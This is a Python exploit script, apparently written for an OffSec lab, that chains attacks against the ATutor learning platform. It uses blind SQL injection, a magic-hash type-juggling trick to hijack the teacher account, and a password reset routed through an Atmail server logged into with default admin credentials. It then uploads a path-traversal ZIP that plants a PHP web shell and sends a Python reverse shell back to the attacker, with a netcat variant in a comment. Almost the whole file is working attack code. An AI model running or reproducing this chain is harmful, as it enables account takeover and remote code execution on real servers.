import sys, re, os, html
import requests
from bs4 import BeautifulSoup

import hashlib, string, itertools
from io import BytesIO
import zipfile

ascii_list = list(range(48,57)) + list(range(97, 123)) + list(range(32,48)) + list(range(57,64)) + list(range(90,97)) + list(range(123,127)) + list(range(64,90))
# List of characters in (rough) order of frequency
# Numbers, small letters, punctuation, big letters (from 32 to 127)

def searchFriends_sqli(ip, inj_str):
    target = f"http://{ip}/ATutor/mods/_standard/social/index_public.php?q={inj_str}"
    r = requests.get(target)
    s = BeautifulSoup(r.text, 'lxml')

    content_length = int(r.headers['Content-Length'])

    if content_length == 20:
        return False 
    else:
        return True

def extract_data(ip, inj):
    # template = "test')/**/or/**/(ascii(substring((select/**/CURRENT_USER()),<num>,1)))=<inj>%23"
    print(f"Extracting data with inj string: {inj}......")

    output = "" # If we already have stuff, can start output with value and change starting i
    for i in range(1,100):
        new_character = False
        for c in ascii_list: # ASCII letters, numbers and punctuation
            query_string = f"test')/**/or/**/(ascii(substring(({inj}),{i},1)))={c}%23"
            res = searchFriends_sqli(ip, query_string)
            # print(f"Checking {chr(c)}: {query_string} -- {res}")
            if res == True:
                new_character = True
                output += chr(c)
                print(f"Success, adding {chr(c)} -- {output}")
                break
        if not new_character:
            print("No possible characters, breaking now!")
            break
    print(f"Extracted data: {output}")
    return output

def get_code (domain, id, creation_date):
    count = 0
    print("Searching for valid email......")
    
    for prefix_length in range(1, 5):
        for word in map(''.join,itertools.product(string.ascii_lowercase, \
            repeat=int(prefix_length))):

            raw_string = f"{word}@{domain}{creation_date}{id}"
            hash = hashlib.md5(raw_string.encode()).hexdigest()
            hash_prefix = hash[:10]
            
            if re.match(r'0+[eE]\d+$', hash_prefix):
                print(f"Valid hash: {hash_prefix}")
                print(f"Raw String: {raw_string}")
                return word

    raise Exception("No valid email found!")
    return ""

def hijack_account(ip, email_prefix, domain, member_id):
    email = f"{email_prefix}@{domain}"
    print(f"Hijacking account {member_id} with email {email}......")
    
    target = f"http://{ip}/ATutor/confirm.php?id={member_id}&m=0&e={email}"
    r = requests.get(target, allow_redirects=False)
    if r.status_code == 302:
        return True
    else:
        return False

def password_reminder(ip, email_prefix, domain):
    email = f"{email_prefix}@{domain}"
    print(f"Sending reset password email for email {email}.....")

    s = requests.Session()

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
    }
    s.headers.update(headers)

    target = f"http://{ip}/ATutor/password_reminder.php"
    data = {
        "form_password_reminder": "true",
        "form_email": email,
        "submit": "Submit"
    }

    # proxies = {
    #     'http': 'http://127.0.0.1:8080'
    # }
    # s.proxies.update(proxies)

    r = s.post(target, data=data)

    if re.findall('No account found with that email address', r.text):
        raise Exception("Password reset unsuccessful!")
    print("Password reset successful!")
    return s

def atmail_admin_login(atmail_ip):
    print("Logging in to atmail......")
    USERNAME = 'admin'
    PASSWORD = 'admin'

    s = requests.Session()

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
    }
    s.headers.update(headers)

    # proxies = {
    #     'http': 'http://127.0.0.1:8080'
    # }
    # s.proxies.update(proxies)

    target = f'http://{atmail_ip}/index.php/admin/index/login'
    data = {
        "Username": USERNAME,
        "Password": PASSWORD,
        "send": 1
    }

    r = s.post(target, data=data)

    if re.match('Authentication failed, try again', r.text):
        raise Exception("Atmail admin authentication failed")
    print("Login successful!")
    return s

def create_atmail_user(session, ip, email_prefix, domain):
    print(f"Creating user {email_prefix}@{domain}.....")
    target = f"http://{ip}/index.php/admin/users/create/"
    data = {
        "NewContact": 1,
        "username": email_prefix,
        "domain": domain,
        "Password": "bromine"
    }
    r = session.post(target, data=data)

    if re.findall('Currently using.*of quota', r.text):
        print("User creation successful!")
        return session
    elif re.findall(f'{email_prefix}@{domain} already exists', r.text):
        print("User already exists!")
        return session
    else:
        raise Exception("Atmail fail to create user!")

def atmail_user_login(atmail_ip, email_prefix, domain):
    s = requests.Session()

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
    }
    s.headers.update(headers)

    # proxies = {
    #     'http': 'http://127.0.0.1:8080'
    # }
    # s.proxies.update(proxies)

    target = f"http://{atmail_ip}/index.php/mail/auth/processlogin"
    data = {
        "emailName": email_prefix,
        "emailDomain": domain,
        "email": f"{email_prefix}%40{domain}",
        "password": "bromine",
        "MailType": "IMAP",
        "Language": "",
        "emailDomainDefault": "",
        "cssStyle": "original",
        "requestedServer": ""
    }
    r = s.post(target, data = data)

    if re.findall('WebAdmin Control Panel', r.text):
        raise Exception("Login unsuccessful!")
    print("Login successful!")
    return s

def get_email_code(session, ip):
    headers = {
        'X-Requested-With': 'XMLHttpRequest'
    }
    print("Searching Atmail inbox......")

    # Get the list of email IDs from teh folder messages
    target = f"http://{ip}/index.php/mail/mail/listfoldermessages"
    r = session.post(target, headers=headers)
    indexes = re.findall(r'id=\\\"(\d+)\\\"', r.text)
    
    # Read email contents for each email
    for index in indexes:
        target = f"http://{ip}/index.php/mail/viewmessage/index/compact/1/folder/INBOX/uniqueId/{index}/threadChildrenUIDs/false"
        
        r = session.post(target, headers=headers)
        
        # Use regex to find PHP link        
        url_matches = re.findall('(http:\\\/\\\/atutor\\\/ATutor\\\/password_reminder.php.*?)&lt;br', r.text)
        if len(url_matches) == 0: continue
        url = url_matches[0]

        # Escape characters
        url = html.unescape(url)
        url = url.replace('&amp;', '&')
        url = url.replace(r'\/', r'/')
        print(f"Found URL: {url}")
        return url

    raise Exception("No valid password reset URL found!")

def reset_password(ip, password_url):
    print("Resetting Password.....")
    s = requests.Session()

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
    }
    s.headers.update(headers)
    proxies = {
        'http': 'http://127.0.0.1:8080'
    }
    s.proxies.update(proxies)

    r = s.get(password_url)

    params = {}
    params_strings = password_url.split('?')[1].split('&')
    for param in params_strings:
        x = param.split('=')
        if len(x) != 2: 
            raise ("Invalid URL!")
        params[x[0]] = x[1]
    
    target = f'http://{ip}/ATutor/password_reminder.php'
    PASSWORD = 'Bromine1!'
    password_hash = hashlib.sha1(PASSWORD.encode()).hexdigest()

    data = {
        'form_change': 'true',
        'id': params['id'],
        'g': params['g'],
        'h': params['h'], 
        'password': PASSWORD,
        'password2': PASSWORD,
        'form_password_hidden': password_hash,
        'password_error': '',
        'submit': 'Submit'
    }

    r = s.post(target, data=data)

def login(ip, username):
    target = f"http://{ip}/ATutor/login.php"
    token = "token"
    PASSWORD = 'Bromine1!'
    password_hash = hashlib.sha1(PASSWORD.encode()).hexdigest()
    hashed = hashlib.sha1((password_hash + token).encode('utf-8'))

    print(f"Logging in as user {username} with password {PASSWORD}......")
    data = {
        "submit": "Login",
        "form_login": username,
        "form_password_hidden": hashed.hexdigest(),
        "token":token
    }

    s = requests.Session()

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
    }

    s.headers.update(headers)

    # proxies = {
    #     'http': 'http://127.0.0.1:8080'
    # }
    # s.proxies.update(proxies)

    r = s.post(target, data=data)
    res = r.text

    if re.search("Invalid login/password combination.",res):
        raise Exception("Invalid Login!")
    print("Login Successful!")
    return s


def build_zip():
    f = BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)

    z.writestr('../../../../var/www/html/ATutor/mods/poc.php5', data='<?php system($_GET["cmd"]);?>')
    z.writestr('imsmanifest.xml', data='invalid file!')
    z.close()
    zip = open('poc.zip','wb')
    zip.write(f.getvalue())
    zip.close()

def upload_zip(ip, session):
    print("Uploading ZIP file with malicios PHP file......")
    build_zip()

    target = f"http://{ip}/ATutor/mods/_standard/tests/import_test.php"

    data = {
        'submit_import': 'Import'
    }

    with open('poc.zip', 'rb') as file:
        files = {
            "file": file
        }

        r = session.post(target,files=files, data=data)

        if 'XML error' not in r.text:
            raise "File Upload Failure"
    print("File Upload Success!")
    return True

def send_command(ip, session, command):
    target = f"http://{ip}/ATutor/mods/poc.php5?cmd={command}"
    r = session.get(target)

    return r.text

def send_reverse_shell(ip, session):
    print("Sending reverse shell... Ensure netcat listening on port 80")
    LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
    LPORT = 80

    # payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
    payload = f"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
    print(f"Reverse shell payload: {payload}")
    send_command(ip, session, payload)

def main():
    if len(sys.argv) != 3:
        print ("(+) usage: %s <target> <atmail>" % sys.argv[0])
        print ('(+) eg: %s 192.168.121.103 192.168.121.106'  % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]
    atmail_ip = sys.argv[2]

    username_injection_string = "select/**/login/**/FROM/**/AT_members/**/LIMIT/**/1"
    # username = extract_data(ip, username_injection_string)
    username = "teacher"

    creation_injection_string = f"select/**/creation_date/**/FROM/**/AT_members/**/WHERE/**/login=\"{username}\""
    # creation_date = extract_data(ip, creation_injection_string)
    creation_date = "2016-03-10 16:00:00"

    memberid_injection_string = f"select/**/member_id/**/FROM/**/AT_members/**/WHERE/**/login=\"{username}\""
    # member_id = extract_data(ip, memberid_injection_string)
    member_id = 1

    print(f"Extracted User Details: {username}, {member_id}, {creation_date}")

    DOMAIN = "offsec.local"

    email_prefix = get_code(DOMAIN, member_id, creation_date)

    atmail_admin_session = atmail_admin_login(atmail_ip)

    create_atmail_user(atmail_admin_session, atmail_ip, email_prefix, DOMAIN)

    hijack_account(ip, email_prefix, DOMAIN, member_id)

    password_reminder(ip, email_prefix, DOMAIN)

    atmail_user_session = atmail_user_login(atmail_ip, email_prefix, DOMAIN)

    password_url = get_email_code(atmail_user_session, atmail_ip)

    reset_password(ip, password_url)

    session = login(ip, username)

    # Main page
    r = session.get(f"http://{ip}/ATutor/users/index.php")
    text = r.text

    # Get the bounce.php link in the main page response
    link = re.findall('href="(bounce.php?.*)"', text)
    if len(link) == 0:
        raise "No valid course!"
    print(f"Visiting intermediate link: {link[0]}")

    # Visit the bounce.php link to choose the course
    r = session.get(f"http://{ip}/ATutor/{link[0]}")

    # Upload zip file with malicious PHP
    upload_zip(ip, session)

    # Send command to our uploaded reverse shell
    # Use ifconfig to test that reverse shell is working
    resp = send_command(ip, session, 'ifconfig')
    if '127.0.0.1' not in resp:
        raise "Remote Code Execution Failure!"
    print("Remote Code Execution working!")

    resp = send_reverse_shell(ip, session)

if __name__ == '__main__':
    main()